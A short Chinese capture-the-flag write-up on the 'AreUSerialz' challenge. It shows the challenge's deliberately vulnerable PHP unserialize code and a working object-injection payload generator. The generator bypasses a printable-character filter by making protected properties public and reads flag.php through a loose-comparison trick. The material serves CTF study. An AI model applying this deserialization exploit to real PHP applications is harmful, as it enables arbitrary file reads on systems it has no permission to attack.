# 知识点
php7.1+版本对属性类型不敏感<br />[[网鼎杯 2020 青龙组]AreUSerialz 1_bazzza的博客-CSDN博客](https://blog.csdn.net/bazzza/article/details/111465607)
# 思路
```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```
protected属性序列化后需要带上%00*%00不可见字符，但不可见字符会被is_valid函数阻拦<br />php7.1+版本对属性类型不敏感，所以我们可以将protected属性改写为public属性<br />由此可得payload
```php
 
<?php
// highlight_file(__FILE__);
class FileHandler {
 
    public $op;
    public $filename;
}
 
$a = new FileHandler();
$a->op = 2;
$a->filename= 'flag.php';
echo urlencode(serialize($a));
?>
```
